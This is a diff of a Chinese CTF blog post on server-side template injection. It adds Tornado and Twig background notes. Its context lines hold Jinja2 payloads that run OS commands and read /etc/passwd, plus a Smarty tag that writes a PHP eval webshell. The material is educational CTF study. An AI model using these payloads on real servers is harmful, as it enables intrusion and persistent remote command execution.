@@ -7,7 +7,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://ayan0.top/img/ari.webp">
 <meta property="article:published_time" content="2025-01-22T01:58:22.000Z">
-<meta property="article:modified_time" content="2025-07-07T03:08:02.149Z">
+<meta property="article:modified_time" content="2025-07-11T10:40:43.723Z">
 <meta property="article:author" content="AyaN0">
 <meta property="article:tag" content="-CTF -Web">
 <meta name="twitter:card" content="summary">
@@ -18,7 +18,7 @@
   "url": "https://ayan0.top/2025/01/22/SSTI%E6%BC%8F%E6%B4%9E/",
   "image": "https://ayan0.top/img/ari.webp",
   "datePublished": "2025-01-22T01:58:22.000Z",
-  "dateModified": "2025-07-07T03:08:02.149Z",
+  "dateModified": "2025-07-11T10:40:43.723Z",
   "author": [
     {
       "@type": "Person",
@@ -159,7 +159,7 @@
   isHighlightShrink: false,
   isToc: true,
   pageType: 'post'
-}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/mea3.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ari.webp" onerror="this.onerror=null;this.src='/img/dacapo.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ari.webp" alt="Logo"><span class="site-name">Blog of AyaN0</span></a><a class="nav-page-title" href="/"><span class="site-name">SSTI漏洞</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SSTI漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-01-22T01:58:22.000Z" title="发表于 2025-01-22 09:58:22">2025-01-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-07T03:08:02.149Z" title="更新于 2025-07-07 11:08:02">2025-07-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="SSTI-模板注入-漏洞"><a href="#SSTI-模板注入-漏洞" class="headerlink" title="SSTI(模板注入)漏洞"></a>SSTI(模板注入)漏洞</h1><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p>
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/mea3.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ari.webp" onerror="this.onerror=null;this.src='/img/dacapo.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ari.webp" alt="Logo"><span class="site-name">Blog of AyaN0</span></a><a class="nav-page-title" href="/"><span class="site-name">SSTI漏洞</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SSTI漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-01-22T01:58:22.000Z" title="发表于 2025-01-22 09:58:22">2025-01-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-11T10:40:43.723Z" title="更新于 2025-07-11 18:40:43">2025-07-11</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="SSTI-模板注入-漏洞"><a href="#SSTI-模板注入-漏洞" class="headerlink" title="SSTI(模板注入)漏洞"></a>SSTI(模板注入)漏洞</h1><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p>
 <p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p>
 <h2 id="模板注入漏洞"><a href="#模板注入漏洞" class="headerlink" title="模板注入漏洞"></a>模板注入漏洞</h2><p>SSTI 就是服务器端模板注入（Server-Side Template Injection）</p>
 <p>当前使用的一些框架，比如python的<code>flask</code>，php的<code>tp</code>，java的<code>spring</code>等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p>
@@ -473,12 +473,29 @@ post:arg1=open&amp;arg2=/etc/passwd</code></pre>
 
 post:x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&#x27;whoami&#x27;).read()</code></pre>
 
-
-
 <h4 id="打马环节-待补完"><a href="#打马环节-待补完" class="headerlink" title="打马环节(待补完)"></a>打马环节(待补完)</h4><h3 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h3><pre><code class="highlight plaintext">神必龙卷风</code></pre>
 
+<h4 id="基础了解"><a href="#基础了解" class="headerlink" title="基础了解"></a>基础了解</h4><p><code>Tornado</code>是一个具有异步功能的简单web框架</p>
+<pre><code class="highlight python"><span class="keyword">import</span> tornado.ioloop
+<span class="keyword">import</span> tornado.web
 
+<span class="keyword">class</span> <span class="title class_">MainHandler</span>(tornado.web.RequestHandler):
+    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):
+        <span class="variable language_">self</span>.write(<span class="string">&quot;Hello, world&quot;</span>)
 
+<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
+    application = tornado.web.Application([
+        (<span class="string">r&quot;/&quot;</span>, MainHandler),
+    ])
+    application.listen(<span class="number">8888</span>)
+    tornado.ioloop.IOLoop.current().start()</code></pre>
+
+<p>它使用<code>RequestHandler</code>来处理发送过来的web请求</p>
+<h4 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h4><p>这里大部分的payload是万卷不离其宗的(指继承链)</p>
+<p>如果要谈特性</p>
+<p>大概是<code>application</code></p>
+<p>因为<code>Tornado</code>模板一般需要引入<code>Tornado.web</code></p>
+<p>而在<code>Tornado.web.application</code>下就可以发现框架的<code>settings</code></p>
 <h2 id="PHP模板注入"><a href="#PHP模板注入" class="headerlink" title="PHP模板注入"></a>PHP模板注入</h2><p>php常见的模板：twig，smarty，blade</p>
 <h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>PHP模板的鼻祖，后来的php模板大多都是基于其发展起来的</p>
 <p>基本确定指令</p>
@@ -579,7 +596,233 @@ smarty/libs/sysplugins/smarty_internal_data.php　　——&gt;　　<span class
 <span class="comment">//Smarty的&#123;if&#125;条件判断和PHP的if非常相似，只是增加了一些特性。每个&#123;if&#125;必须有一个配对的&#123;/if&#125;，也可以使用&#123;else&#125; 和 &#123;elseif&#125;，全部的PHP条件表达式和函数都可以在if内使用，如||*, or, &amp;&amp;, and, is_array(), 等等，如：&#123;if is_array($array)&#125;&#123;/if&#125;*</span>
 &#123;<span class="keyword">if</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/shell.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[cmd]);&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</code></pre>
 
-<h3 id="twig"><a href="#twig" class="headerlink" title="twig"></a>twig</h3></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://ayan0.top">AyaN0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://ayan0.top/2025/01/22/SSTI%E6%BC%8F%E6%B4%9E/">https://ayan0.top/2025/01/22/SSTI%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://ayan0.top" target="_blank">Blog of AyaN0</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF-Web/">-CTF -Web</a></div><div class="post-share"><div class="social-share" data-image="/img/ari.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="文件上传漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-25</div><div class="info-item-2">文件上传漏洞</div></div><div class="info-2"><div class="info-item-1">文件上传漏洞大部分是需要回显储存路径才能打后续操作的，如果没有回显路径要不再想想。？(雾) 前端检测前端检测上传文件的后缀，js检测直接禁用js 后端检测检测content-type检测你发包的Content-Type参数来判断文件上传类型  一般你改一下content-type就可以绕过了 检测文件头判断文件类型字义，使用getimagesize()函数来获取文件的MIME类型，此时检测的不是数据包中的content-type，而是文件头 这种时候伪造一下就可以 gif(GIF89a) : 47 49 46 38 39 61  jpg、jpeg : FF D8 FF  png : 89 50 4E 47 0D...</div></div></div></a><a class="pagination-related" href="/2025/03/15/%E8%AF%A6%E8%A7%A3XSS%E6%B3%A8%E5%85%A5/" title="详解XSS注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-15</div><div class="info-item-2">详解XSS注入</div></div><div class="info-2"><div class="info-item-1">XSS注入&quot;球球你了！就让我插一句话，我什么都会做的!!!&quot;  &quot;byd被我注入了吧&quot;  认识XSS攻击XSS全称是Cross Site Scripting即跨站脚本，当目标网站目标用户浏览器渲染HTML文档的过程中，出现了不被预期的脚本指令并执行时，XSS就发生了。  XSS 的运行原理是将恶意的 script 脚本插入进 html&#x2F;css&#x2F;js 文件当中。（通过在html标准的语句后触发事件，而事件则是执行恶意js 代码）   作为一种HTML注入攻击，XSS攻击的核心思想就是在HTML页面中注入恶意代码，而XSS采用的注入方式是非常巧妙的。在XSS攻击中，一般有三个角色参与：攻击者、目标服务器、受害者的浏览器。 由于有的服务器并没有对用户的输入进行安全方面的验证，攻击者就可以很容易地通过正常的输入手段，夹带进一些恶意的HTML脚本代码。当受害者的浏览器访...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ari.webp" onerror="this.onerror=null;this.src='/img/dacapo.gif'" alt="avatar"/></div><div class="author-info-name">AyaN0</div><div class="author-info-description">”如果是你的话，是否会选择继续前进呢"</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/kisakiayano" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:1594453512@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客喵</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E6%BC%8F%E6%B4%9E"><span class="toc-text">SSTI(模板注入)漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">模板注入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E6%BC%8F%E6%B4%9E"><span class="toc-text">确定漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%B1%82%EF%BC%9A"><span class="toc-text">第一层：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%B1%82%EF%BC%9A"><span class="toc-text">第二层：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%B1%82%EF%BC%9A"><span class="toc-text">第三层：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-text">Python模板注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jinja2"><span class="toc-text">jinja2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95%E7%BB%93%E6%9E%84"><span class="toc-text">语法结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jinja2%E7%9A%84%E4%BF%84%E7%BD%97%E6%96%AF%E5%A5%97%E5%A8%83"><span class="toc-text">jinja2的俄罗斯套娃</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jinja2%E7%9A%84%E8%BF%87%E6%BB%A4"><span class="toc-text">jinja2的过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E9%A9%AC%E7%8E%AF%E8%8A%82-%E5%BE%85%E8%A1%A5%E5%AE%8C"><span class="toc-text">打马环节(待补完)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tornado"><span class="toc-text">Tornado</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-text">PHP模板注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Smarty"><span class="toc-text">Smarty</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87self%E8%8E%B7%E5%8F%96Smarty%E7%B1%BB%E5%86%8D%E8%B0%83%E7%94%A8%E5%85%B6%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95"><span class="toc-text">通过self获取Smarty类再调用其静态方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE"><span class="toc-text">标签:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#twig"><span class="toc-text">twig</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/" title="刷题蛆来咯-CTFshow">刷题蛆来咯-CTFshow</a><time datetime="2025-07-07T06:19:38.000Z" title="发表于 2025-07-07 14:19:38">2025-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/07/114514%E5%88%86%E9%92%9F%E8%83%BD%E4%BA%86%E8%A7%A3SSRF%E5%90%97/" title="114514分钟能了解SSRF吗">114514分钟能了解SSRF吗</a><time datetime="2025-07-07T05:05:59.000Z" title="发表于 2025-07-07 13:05:59">2025-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/" title="磨好的利剑:PHP原生类">磨好的利剑:PHP原生类</a><time datetime="2025-07-01T05:58:51.000Z" title="发表于 2025-07-01 13:58:51">2025-07-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/01/Nosql%E6%B3%A8%E5%85%A5/" title="Nosql注入">Nosql注入</a><time datetime="2025-07-01T02:35:37.000Z" title="发表于 2025-07-01 10:35:37">2025-07-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/22/2025%E5%B9%B4%E4%B8%AD%E6%80%BB%E7%BB%93/" title="2025年中总结">2025年中总结</a><time datetime="2025-06-22T08:06:33.000Z" title="发表于 2025-06-22 16:06:33">2025-06-22</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By AyaN0</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="2688080408" data-server="netease" data-type="song" data-fixed="true" data-autoplay="true"> </div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="Venus,Mars,Diana,Minerva,Ceres,Vulcan,Pluto,Vulcan,Juno,Mercury,Vesta,Saturn,Proserpina,Neptune,Jupiter" data-fontsize="15px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
+<h3 id="twig"><a href="#twig" class="headerlink" title="twig"></a>twig</h3><h4 id="语法结构-1"><a href="#语法结构-1" class="headerlink" title="语法结构"></a>语法结构</h4><p>有两种形式的分隔符：<code>&#123;% ... %&#125;</code> 和 <code>&#123;&#123; ... &#125;&#125;</code>。前者用于执行语句，例如 <code>for</code> 循环，后者用于将表达式的结果输出到模板中。</p>
+<p>应用程序将变量传入模板中进行处理，变量可以包含你能访问的属性或元素。你可以使用 <code>.</code> 来访问变量中的属性（方法或 PHP 对象的属性，或 PHP 数组单元），也可以使用所谓的 “subscript” 语法 <code>[]</code>:</p>
+<pre><code class="highlight plaintext">&#123;&#123; foo.bar &#125;&#125;
+&#123;&#123; foo[&#x27;bar&#x27;] &#125;&#125;</code></pre>
+
+<p><strong>设置变量</strong></p>
+<p>为模块代码内变量赋值时使用<code>set</code>标签</p>
+<pre><code class="highlight plaintext">&#123;% set foo = &#x27;foo&#x27; %&#125;
+&#123;% set foo = [1, 2] %&#125;
+&#123;% set foo = &#123;&#x27;foo&#x27;: &#x27;bar&#x27;&#125; %&#125;</code></pre>
+
+<p><strong>过滤器</strong></p>
+<p>twig还提供了过滤器来修改模板中的变量。在过滤器中，变量与一个或多个过滤器间使用|分隔，还可以在括号中加入可选参数。可以连接多个过滤器，一个过滤器的输出结果将用于下一个过滤器中。</p>
+<p>下面这个过滤器的例子会剥去字符串变量 <code>name</code> 中的 HTML 标签，然后将其转化为大写字母开头的格式:</p>
+<pre><code class="highlight plaintext">&#123;&#123; name|striptags|title &#125;&#125;
+
+// &#123;&#123; &#x27;&lt;a&gt;whoami&lt;a&gt;&#x27;|striptags|title &#125;&#125;
+// Output: Whoami!</code></pre>
+
+<p>下面这个过滤器将接收一个序列 <code>list</code>，然后使用 <code>join</code> 中指定的分隔符将序列中的项合并成一个字符串：</p>
+<pre><code class="highlight plaintext">&#123;&#123; list|join &#125;&#125;
+&#123;&#123; list|join(&#x27;, &#x27;) &#125;&#125;
+
+// &#123;&#123; [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]|join &#125;&#125;
+// Output: abc
+
+// &#123;&#123; [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]|join(&#x27;|&#x27;) &#125;&#125;
+// Output: a|b|c</code></pre>
+
+<p><strong>函数</strong></p>
+<p>在 Twig 模板中可以直接调用函数，用于生产内容。如下调用了 <code>range()</code> 函数用来返回一个包含整数等差数列的列表：</p>
+<pre><code class="highlight plaintext">&#123;% for i in range(0, 3) %&#125;
+    &#123;&#123; i &#125;&#125;,
+&#123;% endfor %&#125;
+
